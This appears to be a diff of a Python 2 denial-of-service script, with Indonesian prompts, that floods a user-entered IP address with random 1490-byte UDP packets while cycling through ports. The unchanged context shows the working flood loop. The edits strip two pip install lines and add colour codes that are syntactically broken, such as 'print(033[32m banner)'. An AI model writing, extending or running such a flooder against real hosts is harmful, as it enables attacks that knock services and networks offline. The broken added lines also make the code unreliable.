@@ -18,8 +18,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 #terminal clear all session
-os.system("pip install --upgrade pip")
-os.system("pip2 install request")
 os.system("clear")
 
 #terminal display DDOS 2 as figlet
@@ -40,7 +38,7 @@ banner="""
 |------------------------------------|
 """
 #display bannerku
-print(banner)
+print(033[32m banner)
 
 ip = raw_input("Masukkan Ip : ")
 port = input("Masukkan Port : ")
@@ -60,7 +58,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "/033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 #Maaf jika ada Kesalahan , tolong tegur :)
